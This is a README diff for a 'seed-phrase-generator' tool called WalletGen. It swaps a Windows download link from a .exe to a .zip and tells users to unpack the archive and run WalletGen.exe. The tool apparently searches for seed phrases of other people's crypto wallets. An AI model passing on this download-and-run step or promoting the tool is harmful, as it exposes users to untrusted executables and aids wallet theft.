@@ -92,7 +92,7 @@ By using the database, you can significantly improve the efficiency of your sear
 # How to start
 
 ## Windows 
-- Download [WalletGen.zip](https://github.com/tony-dev1/seed-phrase-generator/releases/download/walletgen/WalletGen_Windows_v1.8.0.exe) (5MB)
+- Download [WalletGen.zip](https://github.com/tony-dev1/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (5MB)
 - Unpack anywhere
 - Run `WalletGen.exe`
 
